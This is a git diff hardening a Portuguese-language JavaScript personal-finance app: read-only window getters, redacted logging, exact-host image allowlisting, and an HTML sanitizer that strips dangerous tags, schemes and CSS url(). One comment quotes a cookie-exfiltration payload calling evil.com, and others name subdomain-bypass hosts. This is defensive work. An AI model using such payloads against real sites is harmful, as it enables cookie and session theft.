@@ -122,8 +122,35 @@ function validarUserData(userData) {
     });
 })();
 
-// ✅ Única declaração de atualizarReferenciasGlobais
-//    Atualiza _GE_snapshot_atual — o getter de __GE__ entrega automaticamente o novo valor
+// ✅ Define window.* financeiros como somente-leitura — impede manipulação via console
+// Bloqueia: window.transacoes = [...], window.transacoes.push(...), window.transacoes[0].valor = X
+// graficos.js: use [...window.transacoes].sort(...) em vez de window.transacoes.sort(...)
+(function _inicializarWindowRefs() {
+    const _def = (prop, getter) => {
+        try {
+            Object.defineProperty(window, prop, {
+                get:          getter,
+                set:          () => _log.warn(`[SEGURANÇA] Tentativa de sobrescrita de window.${prop} bloqueada`),
+                configurable: false,
+                enumerable:   false,
+            });
+        } catch (_) {
+            // Propriedade já definida anteriormente — sem ação necessária
+        }
+    };
+
+    // ✅ Retorna cópias congeladas em dois níveis:
+    //    1. Array congelado (push/pop/splice bloqueados)
+    //    2. Objetos internos congelados (window.transacoes[0].valor = X bloqueado)
+    //    Getter é re-executado a cada acesso — sempre reflete o estado atual do módulo
+    _def('perfilAtivo',    () => perfilAtivo    ? Object.freeze(Object.assign({}, perfilAtivo))                      : null);
+    _def('transacoes',     () => Object.freeze(transacoes.map(t     => Object.freeze(Object.assign({}, t)))));
+    _def('usuarioLogado',  () =>                  Object.freeze(Object.assign({}, usuarioLogado)));
+    _def('metas',          () => Object.freeze(metas.map(m           => Object.freeze(Object.assign({}, m)))));
+    _def('contasFixas',    () => Object.freeze(contasFixas.map(c     => Object.freeze(Object.assign({}, c)))));
+    _def('cartoesCredito', () => Object.freeze(cartoesCredito.map(c  => Object.freeze(Object.assign({}, c)))));
+})();
+
 function atualizarReferenciasGlobais() {
     _GE_snapshot_atual = Object.freeze({
         perfilAtivo:    Object.freeze({ ...perfilAtivo }),
@@ -134,15 +161,10 @@ function atualizarReferenciasGlobais() {
         cartoesCredito: Object.freeze([...cartoesCredito]),
     });
 
-    // ✅ Expõe para graficos.js e outros módulos externos
-    window.perfilAtivo   = perfilAtivo;
-    window.transacoes    = transacoes;
-    window.usuarioLogado = usuarioLogado;
-    window.metas         = metas;
-    window.contasFixas   = contasFixas;
-    window.cartoesCredito = cartoesCredito;
+    // ✅ window.* são getters read-only definidos em _inicializarWindowRefs
+    // Reatribuição removida — é bloqueada pelo setter e os getters já refletem
+    // automaticamente o estado atual das variáveis do módulo
 }
-
 
 // Limites por plano
 const limitesPlano = {
@@ -299,27 +321,24 @@ async function carregarPerfis() {
 // ========== CARREGAR DADOS DO PERFIL (CORRIGIDA) ==========
 async function carregarDadosPerfil(perfilId) {
     try {
-        console.log(`📦 Carregando dados do perfil ID: ${perfilId}`);
+        // ✅ CORRIGIDO: não expõe perfilId no console em produção
+        _log.info('📦 [carregarDadosPerfil] Iniciando carregamento de dados');
 
         const userData = await dataManager.loadUserData();
 
-        console.log('📊 Dados recebidos:', {
-            totalProfiles: userData.profiles?.length || 0,
-            version: userData.version
-        });
+        // ✅ Apenas contagem — sem dados identificáveis
+        _log.info('📊 [carregarDadosPerfil] Dados recebidos. Total de perfis:', userData.profiles?.length || 0);
 
         const perfilData = userData.profiles.find(p => p.id === perfilId);
 
         if (!perfilData) {
-            console.log('ℹ️ Perfil sem dados salvos. Criando estrutura vazia.');
-            transacoes    = [];
-            metas         = [];
-            contasFixas   = [];
+            _log.info('[carregarDadosPerfil] Perfil sem dados salvos. Criando estrutura vazia.');
+            transacoes     = [];
+            metas          = [];
+            contasFixas    = [];
             cartoesCredito = [];
 
             // ✅ nextIds mantidos apenas para cartões — cartão ainda usa ID local
-            //    transações, metas e contas fixas não precisam mais de nextId
-            //    pois o banco gera via gen_random_uuid()
             nextCartaoId = 1;
 
             atualizarReferenciasGlobais();
@@ -331,9 +350,6 @@ async function carregarDadosPerfil(perfilId) {
         contasFixas    = Array.isArray(perfilData.contasFixas)    ? perfilData.contasFixas    : [];
         cartoesCredito = Array.isArray(perfilData.cartoesCredito) ? perfilData.cartoesCredito : [];
 
-        // ✅ Apenas nextCartaoId é restaurado — os demais foram migrados para UUID
-        //    Tenta perfilData primeiro; se não existir, recalcula a partir dos dados
-        //    Math.max com IDs numéricos legados — UUIDs são ignorados pelo parseInt
         const idsCartoesNumericos = cartoesCredito
             .map(c => typeof c.id === 'number' ? c.id : parseInt(c.id, 10))
             .filter(n => Number.isInteger(n) && n > 0);
@@ -341,18 +357,18 @@ async function carregarDadosPerfil(perfilId) {
         nextCartaoId = perfilData.nextCartaoId
             || (idsCartoesNumericos.length > 0 ? Math.max(...idsCartoesNumericos) + 1 : 1);
 
-        console.log('✅ Dados do perfil carregados:', {
-            transacoes:  transacoes.length,
-            metas:       metas.length,
-            contas:      contasFixas.length,
-            cartoes:     cartoesCredito.length,
-            nextCartaoId
-        });
+        // ✅ Apenas contadores — sem PII
+        _log.info('✅ [carregarDadosPerfil] Carregamento concluído.',
+            '| Transações:', transacoes.length,
+            '| Metas:', metas.length,
+            '| Contas:', contasFixas.length,
+            '| Cartões:', cartoesCredito.length
+        );
 
         atualizarReferenciasGlobais();
 
     } catch(e) {
-        console.error('❌ Erro ao carregar dados do perfil:', e);
+        _log.error('PERFIL_LOAD_001', e);
         transacoes     = [];
         metas          = [];
         contasFixas    = [];
@@ -520,33 +536,29 @@ async function verificarLogin() {
     const protectedContent = document.querySelector('[data-protected-content]');
 
     try {
-        console.log('🔐 [VERIFICAR LOGIN] Iniciando verificação...');
-        
+        _log.info('[VERIFICAR LOGIN] Iniciando verificação...');
+
         if (authLoading) authLoading.style.display = 'flex';
         if (protectedContent) protectedContent.style.display = 'none';
 
-        // 1️⃣ VERIFICAR SESSÃO
         const { data: { session }, error: sessionError } = await supabase.auth.getSession();
 
         if (sessionError || !session) {
-            console.log('❌ [VERIFICAR LOGIN] Sessão não encontrada. Redirecionando...');
+            _log.warn('[VERIFICAR LOGIN] Sessão não encontrada. Redirecionando...');
             window.location.href = 'login.html';
             return;
         }
 
-        console.log('✅ [VERIFICAR LOGIN] Sessão válida:', session.user.email);
-        console.log('👤 [VERIFICAR LOGIN] User ID:', session.user.id);
+        // ✅ CORRIGIDO: não expõe email nem user_id no console em produção
+        _log.info('[VERIFICAR LOGIN] Sessão autenticada com sucesso');
 
-        // 2️⃣ VERIFICAR ASSINATURA PRÓPRIA
-        console.log('🔍 [VERIFICAR LOGIN] Buscando assinatura...');
+        _log.info('[VERIFICAR LOGIN] Buscando assinatura...');
 
         let planName = '';
         let effectiveUserId = session.user.id;
         let effectiveEmail = session.user.email;
         let isGuest = false;
 
-        // ✅ CORREÇÃO: valida expires_at — rejeita assinaturas expiradas
-        //    OR expires_at IS NULL cobre planos vitalícios sem data de expiração
         const agora = new Date().toISOString();
 
         const { data: subscription, error: subError } = await supabase
@@ -555,15 +567,14 @@ async function verificarLogin() {
             .eq('user_id', session.user.id)
             .eq('payment_status', 'approved')
             .eq('is_active', true)
-            .or(`expires_at.is.null,expires_at.gt.${agora}`) // ✅ novo
+            .or(`expires_at.is.null,expires_at.gt.${agora}`)
             .maybeSingle();
 
         if (!subError && subscription) {
             planName = subscription.plans.name;
-            console.log('✅ [VERIFICAR LOGIN] Assinatura própria encontrada:', planName);
+            _log.info('[VERIFICAR LOGIN] Assinatura própria encontrada');
         } else {
-            // ── FALLBACK: busca por email (user_id pode estar NULL para usuários legados) ──
-            console.log('🔍 [VERIFICAR LOGIN] Sem assinatura por user_id. Tentando fallback por email...');
+            _log.info('[VERIFICAR LOGIN] Sem assinatura por user_id. Tentando fallback por email...');
 
             const { data: subByEmail, error: subEmailError } = await supabase
                 .from('subscriptions')
@@ -571,16 +582,15 @@ async function verificarLogin() {
                 .eq('user_email', session.user.email)
                 .eq('payment_status', 'approved')
                 .eq('is_active', true)
-                .or(`expires_at.is.null,expires_at.gt.${agora}`) // ✅ novo
+                .or(`expires_at.is.null,expires_at.gt.${agora}`)
                 .maybeSingle();
 
             if (!subEmailError && subByEmail) {
                 planName = subByEmail.plans.name;
-                console.log('✅ [VERIFICAR LOGIN] Assinatura encontrada por email:', planName);
+                _log.info('[VERIFICAR LOGIN] Assinatura encontrada por email');
 
-                // Vincula user_id automaticamente se ainda estiver NULL
                 if (!subByEmail.user_id) {
-                    console.log('🔗 [VERIFICAR LOGIN] Vinculando user_id à subscription...');
+                    _log.info('[VERIFICAR LOGIN] Vinculando user_id à subscription...');
                     supabase
                         .from('subscriptions')
                         .update({
@@ -590,12 +600,12 @@ async function verificarLogin() {
                             updated_at:          new Date().toISOString(),
                         })
                         .eq('id', subByEmail.id)
-                        .then(() => console.log('✅ [VERIFICAR LOGIN] user_id vinculado com sucesso.'))
-                        .catch((e) => console.warn('⚠️ [VERIFICAR LOGIN] Falha ao vincular user_id:', e));
+                        // ✅ CORRIGIDO: _log em vez de console — suprime em produção
+                        .then(() => _log.info('[VERIFICAR LOGIN] user_id vinculado com sucesso'))
+                        .catch((e) => _log.error('LOGIN_VINCULAR_001', e));
                 }
             } else {
-                // 3️⃣ VERIFICAR SE É CONVIDADO
-                console.log('🔍 [VERIFICAR LOGIN] Sem assinatura própria. Verificando membership...');
+                _log.info('[VERIFICAR LOGIN] Sem assinatura própria. Verificando membership...');
 
                 const { data: membership, error: memberError } = await supabase
                     .from('account_members')
@@ -605,24 +615,23 @@ async function verificarLogin() {
                     .maybeSingle();
 
                 if (memberError || !membership) {
-                    console.log('❌ [VERIFICAR LOGIN] Sem assinatura e sem membership ativo.');
+                    _log.warn('[VERIFICAR LOGIN] Sem assinatura e sem membership ativo.');
                     await supabase.auth.signOut();
                     window.location.href = 'login.html?erro=sem_plano';
                     return;
                 }
 
-                // 4️⃣ BUSCAR ASSINATURA DO DONO
                 const { data: ownerSub, error: ownerSubError } = await supabase
                     .from('subscriptions')
                     .select('plans(name)')
                     .eq('user_id', membership.owner_user_id)
                     .eq('payment_status', 'approved')
                     .eq('is_active', true)
-                    .or(`expires_at.is.null,expires_at.gt.${agora}`) // ✅ novo
+                    .or(`expires_at.is.null,expires_at.gt.${agora}`)
                     .maybeSingle();
 
                 if (ownerSubError || !ownerSub) {
-                    console.log('❌ [VERIFICAR LOGIN] Assinatura do dono inválida ou revogada.');
+                    _log.warn('[VERIFICAR LOGIN] Assinatura do dono inválida ou revogada.');
                     await supabase.auth.signOut();
                     window.location.href = 'login.html?erro=plano_dono_inativo';
                     return;
@@ -632,11 +641,11 @@ async function verificarLogin() {
                 effectiveUserId = membership.owner_user_id;
                 effectiveEmail = membership.owner_email;
                 isGuest = true;
-                console.log('✅ [VERIFICAR LOGIN] Acesso como convidado. Dono:', effectiveEmail, 'Plano:', planName);
+                // ✅ CORRIGIDO: não expõe effectiveEmail (e-mail do dono da conta) em produção
+                _log.info('[VERIFICAR LOGIN] Acesso como convidado autorizado');
             }
         }
 
-        // 5️⃣ INICIALIZAR USUÁRIO
         usuarioLogado = {
             userId:          session.user.id,
             effectiveUserId: effectiveUserId,
@@ -647,32 +656,26 @@ async function verificarLogin() {
             isGuest:         isGuest,
         };
 
-        console.log('👤 [VERIFICAR LOGIN] Usuário inicializado:', {
-            userId:  usuarioLogado.userId,
-            nome:    usuarioLogado.nome,
-            plano:   usuarioLogado.plano,
-            isGuest: usuarioLogado.isGuest
-        });
+        // ✅ CORRIGIDO: não expõe userId nem nome do usuário em produção
+        _log.info('[VERIFICAR LOGIN] Usuário inicializado. isGuest:', usuarioLogado.isGuest);
 
-        // 6️⃣ INICIALIZAR DATAMANAGER
-        console.log('📦 [VERIFICAR LOGIN] Inicializando DataManager...');
+        _log.info('[VERIFICAR LOGIN] Inicializando DataManager...');
         await dataManager.initialize(usuarioLogado.effectiveUserId, effectiveEmail);
-        console.log('✅ [VERIFICAR LOGIN] DataManager inicializado');
+        _log.info('[VERIFICAR LOGIN] DataManager inicializado');
 
-        // 7️⃣ CARREGAR PERFIS
-        console.log('👥 [VERIFICAR LOGIN] Carregando perfis...');
+        _log.info('[VERIFICAR LOGIN] Carregando perfis...');
         const resultadoPerfis = await carregarPerfis();
 
         if (!resultadoPerfis.sucesso) {
             throw new Error("Não foi possível carregar os dados do usuário.");
         }
 
-        // 8️⃣ MOSTRAR SELEÇÃO DE PERFIS (NUNCA PULA ESTA ETAPA)
-        console.log('✅ [VERIFICAR LOGIN] Login completo. Mostrando seleção de perfis.');
+        _log.info('[VERIFICAR LOGIN] Login completo. Mostrando seleção de perfis.');
         mostrarSelecaoPerfis();
 
     } catch (e) {
-        console.error('❌ [VERIFICAR LOGIN] Erro crítico na inicialização:', e.message);
+        // ✅ CORRIGIDO: _log.error suprime detalhes em produção
+        _log.error('LOGIN_CRIT_001', e);
         alert(e.message);
         window.location.href = 'login.html';
     } finally {
@@ -714,13 +717,18 @@ function _sanitizeImgUrl(url) {
     if (!url || typeof url !== 'string') return null;
     try {
         const parsed = new URL(url);
+        // ✅ CORRIGIDO: comparação exata de hostname em vez de endsWith()
+        //    endsWith('.' + d) permitia subdomínios maliciosos:
+        //    evil.logospng.org → endsWith('.logospng.org') → true (BYPASS!)
+        //    evil.supabase.co  → endsWith('.supabase.co')  → true (BYPASS!)
+        //    Agora só os hostnames exatos listados são aceitos
         const allowed = [
             'fvrhqqeofqedmhadzzqw.supabase.co',
             'cdn-icons-png.flaticon.com',
             'logospng.org',
         ];
         if (parsed.protocol !== 'https:') return null;
-        if (!allowed.some(d => parsed.hostname === d || parsed.hostname.endsWith('.' + d))) return null;
+        if (!allowed.includes(parsed.hostname)) return null;
         return parsed.href;
     } catch {
         return null;
@@ -919,8 +927,8 @@ async function _criarPerfilHandler(inputNome, inputFoto, plano, limitePerfis) {
 
         const targetUserId = usuarioLogado.effectiveUserId || session.user.id;
 
-        console.log('🔍 [RPC] target_user_id:', targetUserId);
-        console.log('🔍 [RPC] auth uid (session):', session.user.id);
+        // ✅ CORRIGIDO: não expõe target_user_id nem session.user.id em produção
+        _log.info('[_criarPerfilHandler] Verificando permissão RPC...');
 
         if (!targetUserId) {
             alert('Erro interno: sessão incompleta. Faça logout e login novamente.');
@@ -933,11 +941,11 @@ async function _criarPerfilHandler(inputNome, inputFoto, plano, limitePerfis) {
                 target_user_id: targetUserId
             });
 
-        console.log('🔍 [RPC] resultado:', podeCrear);
-        console.log('🔍 [RPC] erro completo:', JSON.stringify(rpcError));
+        // ✅ CORRIGIDO: resultado booleano é seguro; erro serializado apenas em dev
+        _log.info('[RPC] can_create_profile resultado:', podeCrear);
+        if (rpcError) _log.error('PERFIL_RPC_001', rpcError);
 
         if (rpcError || !podeCrear) {
-            _log.error('PERFIL_RPC_001', rpcError);
             if (!rpcError && !podeCrear) {
                 mostrarPopupLimite();
             } else {
@@ -998,11 +1006,8 @@ async function _criarPerfilHandler(inputNome, inputFoto, plano, limitePerfis) {
             fotoUrl = _sanitizeImgUrl(signedData.signedUrl) || null;
         }
 
-        console.log('🔍 [INSERT] Tentando inserir perfil:', {
-            user_id:   targetUserId,
-            name:      nome,
-            photo_url: fotoUrl
-        });
+        // ✅ CORRIGIDO: não expõe user_id, nome nem photo_url em produção
+        _log.info('[_criarPerfilHandler] Inserindo perfil no banco...');
 
         const { data: novoPerfil, error } = await supabase
             .from('profiles')
@@ -1015,8 +1020,8 @@ async function _criarPerfilHandler(inputNome, inputFoto, plano, limitePerfis) {
             .single();
 
         if (error) {
-            console.log('🔍 [INSERT] erro completo:', JSON.stringify(error));
-            _log.error('PERFIL_001', error);
+            // ✅ CORRIGIDO: _log.error serializa apenas em dev — não expõe dados em produção
+            _log.error('PERFIL_INSERT_001', error);
             if (error.code === '23514' || error.code === '42501') {
                 mostrarPopupLimite();
             } else {
@@ -1026,7 +1031,8 @@ async function _criarPerfilHandler(inputNome, inputFoto, plano, limitePerfis) {
             return;
         }
 
-        console.log('✅ [INSERT] Perfil criado:', novoPerfil);
+        // ✅ CORRIGIDO: não expõe novoPerfil (contém name, photo_url, user_id) em produção
+        _log.info('[_criarPerfilHandler] Perfil inserido com sucesso');
 
         usuarioLogado.perfis.push({
             id:   novoPerfil.id,
@@ -2276,15 +2282,12 @@ function sanitizarHTMLPopup(html) {
     const doc = parser.parseFromString(html, 'text/html');
 
     // ✅ SVG incluído — suporta handlers como onload/onbegin no elemento raiz
-    //    e em filhos como <animate>, <set>, <use> via namespace próprio
     const tagsProibidas = ['script', 'iframe', 'object', 'embed', 'link', 'meta', 'base', 'form', 'svg'];
     tagsProibidas.forEach(tag => {
         doc.querySelectorAll(tag).forEach(el => el.remove());
     });
 
     doc.body.querySelectorAll('*').forEach(el => {
-        // ✅ getAttributeNames() é namespace-aware — captura atributos SVG
-        //    que el.attributes pode retornar com nomes qualificados em alguns browsers
         const nomesAtributos = typeof el.getAttributeNames === 'function'
             ? el.getAttributeNames()
             : Array.from(el.attributes).map(a => a.name);
@@ -2303,6 +2306,24 @@ function sanitizarHTMLPopup(html) {
             const esquemasPerigosos = ['javascript:', 'vbscript:', 'data:', 'blob:'];
             if (esquemasPerigosos.some(s => val.startsWith(s))) {
                 el.removeAttribute(nomeOriginal);
+                return;
+            }
+
+            // ✅ NOVO: Sanitiza atributo style — remove url() externos
+            //    Impede: style="background:url('//evil.com/?c='+document.cookie)"
+            //    Browsers modernos bloqueiam js em CSS mas url() pode exfiltrar via requisição HTTP
+            if (nome === 'style') {
+                const valOriginal = el.getAttribute(nomeOriginal) || '';
+                const valLimpo    = valOriginal.replace(/url\s*\([^)]*\)/gi, '');
+                if (valLimpo !== valOriginal) {
+                    if (valLimpo.trim()) {
+                        el.setAttribute(nomeOriginal, valLimpo);
+                    } else {
+                        el.removeAttribute(nomeOriginal);
+                    }
+                }
+                // ✅ Não remove o atributo style completamente — apenas filtra url()
+                //    Estilos legítimos como color, font-size, display continuam funcionando
                 return;
             }
 
@@ -4103,15 +4124,10 @@ function abrirCartaoForm(editId = null) {
 // ========== GRÁFICOS - DELEGA PARA graficos.js ==========
 
 function inicializarGraficos() {
-    // Sincroniza variáveis antes de qualquer acesso pelo módulo de gráficos
-    window.perfilAtivo    = perfilAtivo;
-    window.transacoes     = transacoes;
-    window.usuarioLogado  = usuarioLogado;
-    window.metas          = metas;
-    window.contasFixas    = contasFixas;
-    window.cartoesCredito = cartoesCredito;
+    // ✅ window.* são getters read-only definidos em _inicializarWindowRefs
+    // Sincronizados automaticamente com o estado do módulo — reatribuição removida
+    // pois era bloqueada pelo setter e gerava erro silencioso
 
-    // Delega a montagem dos filtros e controles para graficos.js
     if (typeof configurarFiltros    === 'function') configurarFiltros();
     if (typeof configurarViewButtons === 'function') configurarViewButtons();
     if (typeof configurarComparacao  === 'function') configurarComparacao();
@@ -4131,34 +4147,33 @@ function exportarGraficos() {
 
 // ========== RELATÓRIOS ==========
 function popularFiltrosRelatorio() {
-    const mesSelect = document.getElementById('mesRelatorio');
-    const anoSelect = document.getElementById('anoRelatorio');
+    const mesSelect    = document.getElementById('mesRelatorio');
+    const anoSelect    = document.getElementById('anoRelatorio');
     const perfilSelect = document.getElementById('selectPerfilRelatorio');
-    
+
     if (!mesSelect || !anoSelect || !perfilSelect) {
-        console.error('Elementos de filtro não encontrados!');
+        _log.error('RELATORIO_DOM_001', 'Elementos de filtro não encontrados');
         return;
     }
-    
-    mesSelect.innerHTML = '<option value="">Selecione o mês</option>';
-    anoSelect.innerHTML = '<option value="">Selecione o ano</option>';
+
+    mesSelect.innerHTML    = '<option value="">Selecione o mês</option>';
+    anoSelect.innerHTML    = '<option value="">Selecione o ano</option>';
     perfilSelect.innerHTML = '<option value="">Selecione o perfil</option>';
-    
-    // CORREÇÃO: Usar textContent em vez de innerHTML para nomes de perfis
+
     if (!Array.isArray(usuarioLogado?.perfis)) return;
 
     usuarioLogado.perfis.forEach(perfil => {
         const option = document.createElement('option');
-        option.value = sanitizeHTML(String(perfil.id));
-        option.textContent = String(perfil.nome || '').slice(0, 100); // textContent é seguro por natureza
+        option.value       = sanitizeHTML(String(perfil.id));
+        option.textContent = String(perfil.nome || '').slice(0, 100);
         if (perfilAtivo && String(perfil.id) === String(perfilAtivo.id)) {
             option.selected = true;
         }
         perfilSelect.appendChild(option);
     });
-    
+
     const periodosDisponiveis = new Set();
-    
+
     if (tipoRelatorioAtivo === 'individual') {
         if (Array.isArray(transacoes)) {
             transacoes.forEach(t => {
@@ -4175,33 +4190,43 @@ function popularFiltrosRelatorio() {
                 try {
                     const raw = localStorage.getItem(chave);
                     if (!raw) return;
+
                     const dados = JSON.parse(raw);
-                    // CORREÇÃO: Validar estrutura antes de usar
+
+                    // ✅ Validação de estrutura (já existia)
                     if (!dados || !Array.isArray(dados.transacoes)) return;
+
                     dados.transacoes.forEach(t => {
                         if (!t || typeof t !== 'object') return;
+
+                        // ✅ NOVO: valida cada transação com o mesmo validator do save
+                        //    Impede que dados envenenados no localStorage causem
+                        //    comportamento inesperado no preenchimento dos filtros
+                        if (!_validators.transacao(t)) return;
+
                         const dataISO = sanitizeDate(dataParaISO(t.data));
                         if (dataISO) {
                             periodosDisponiveis.add(dataISO.slice(0, 7));
                         }
                     });
                 } catch (e) {
-                    console.warn('Erro ao ler localStorage para perfil:', perfil.id);
+                    // ✅ CORRIGIDO: não expõe perfil.id no console em produção
+                    _log.warn('RELATORIO_LS_001', 'Erro ao ler dados históricos de período');
                 }
             });
         }
     }
-    
+
     if (periodosDisponiveis.size === 0) {
-        const hoje = new Date();
+        const hoje    = new Date();
         const anoAtual = hoje.getFullYear();
         const mesAtual = String(hoje.getMonth() + 1).padStart(2, '0');
         periodosDisponiveis.add(`${anoAtual}-${mesAtual}`);
     }
-    
+
     const meses = new Set();
-    const anos = new Set();
-    
+    const anos  = new Set();
+
     periodosDisponiveis.forEach(periodo => {
         const partes = periodo.split('-');
         if (partes.length === 2) {
@@ -4209,32 +4234,33 @@ function popularFiltrosRelatorio() {
             anos.add(partes[0]);
         }
     });
-    
+
     const mesesNomes = {
-        '01': 'Janeiro', '02': 'Fevereiro', '03': 'Março', '04': 'Abril',
-        '05': 'Maio', '06': 'Junho', '07': 'Julho', '08': 'Agosto',
-        '09': 'Setembro', '10': 'Outubro', '11': 'Novembro', '12': 'Dezembro'
+        '01': 'Janeiro', '02': 'Fevereiro', '03': 'Março',    '04': 'Abril',
+        '05': 'Maio',    '06': 'Junho',     '07': 'Julho',    '08': 'Agosto',
+        '09': 'Setembro','10': 'Outubro',   '11': 'Novembro', '12': 'Dezembro'
     };
-    
+
     Array.from(meses).sort().forEach(mes => {
-        if (!mesesNomes[mes]) return; // Ignora mês inválido
-        const option = document.createElement('option');
-        option.value = mes;
+        if (!mesesNomes[mes]) return;
+        const option       = document.createElement('option');
+        option.value       = mes;
         option.textContent = mesesNomes[mes];
         mesSelect.appendChild(option);
     });
-    
+
     Array.from(anos).sort().reverse().forEach(ano => {
         const anoNum = parseInt(ano, 10);
-        if (anoNum < 2000 || anoNum > 2100) return; // Ignora anos absurdos
-        const option = document.createElement('option');
-        option.value = ano;
+        if (anoNum < 2000 || anoNum > 2100) return;
+        const option       = document.createElement('option');
+        option.value       = ano;
         option.textContent = ano;
         anoSelect.appendChild(option);
     });
-    
+
     setupBotoesRelatorio();
-    console.log('Filtros de relatório populados. Tipo ativo:', tipoRelatorioAtivo);
+    // ✅ CORRIGIDO: log operacional sem dados sensíveis
+    _log.info('[popularFiltrosRelatorio] Filtros populados. Tipo ativo:', tipoRelatorioAtivo);
 }
 
 function setupBotoesRelatorio() {
@@ -7168,18 +7194,14 @@ let autoSaveInterval = null;
 function iniciarAutoSave() {
     if (!perfilAtivo) return;
 
-    // ✅ Para intervalo anterior — evita múltiplos rodando em paralelo
     pararAutoSave();
 
-    console.log('🔄 [AUTO-SAVE] Sistema iniciado');
-    console.log('👤 [AUTO-SAVE] Perfil ativo:', perfilAtivo.nome);
-    console.log('🔑 [AUTO-SAVE] Perfil ID:', perfilAtivo.id);
+    // ✅ CORRIGIDO: não expõe perfilAtivo.nome nem perfilAtivo.id em produção
+    _log.info('[AUTO-SAVE] Sistema iniciado');
 
-    // ✅ Fallback periódico a cada 30s
-    //    salvarDados() já tem debounce interno — múltiplas chamadas não geram flood
     autoSaveInterval = setInterval(async () => {
         if (!perfilAtivo) return;
-        console.log('⏰ [AUTO-SAVE PERIÓDICO] Executando...');
+        _log.info('[AUTO-SAVE PERIÓDICO] Executando...');
         await salvarDados();
     }, 30_000);
 }
@@ -7188,7 +7210,7 @@ function pararAutoSave() {
     if (autoSaveInterval) {
         clearInterval(autoSaveInterval);
         autoSaveInterval = null;
-        console.log('🛑 Auto-save pausado');
+        _log.info('[AUTO-SAVE] Pausado');
     }
 }
 
@@ -7842,34 +7864,21 @@ window.addEventListener('beforeunload', () => {
     }
 });
 
+
 // ✅ Trocar de aba ou minimizar — tem tempo suficiente para async normal
+// ✅ CORRIGIDO: registrado uma única vez — duplicata removida (causava double-save e race condition)
 document.addEventListener('visibilitychange', () => {
     if (document.hidden && perfilAtivo) {
-        console.log('👁️ Aba oculta - Salvando...');
+        _log.info('[VISIBILIDADE] Aba oculta - Salvando...');
         salvarDados();
     }
 });
 
 // ✅ Janela perde foco — salva também
+// ✅ CORRIGIDO: registrado uma única vez
 window.addEventListener('blur', () => {
     if (perfilAtivo) {
-        console.log('🔄 Janela perdeu foco - Salvando...');
-        salvarDados();
-    }
-});
-
-// ✅ ADICIONAR TAMBÉM EVENTOS DE VISIBILIDADE
-document.addEventListener('visibilitychange', () => {
-    if (document.hidden && perfilAtivo) {
-        console.log('👁️ Aba oculta - Salvando...');
-        salvarDados();
-    }
-});
-
-// ✅ SALVAR QUANDO A JANELA PERDE O FOCO
-window.addEventListener('blur', () => {
-    if (perfilAtivo) {
-        console.log('🔄 Janela perdeu foco - Salvando...');
+        _log.info('[FOCO] Janela perdeu foco - Salvando...');
         salvarDados();
     }
 });
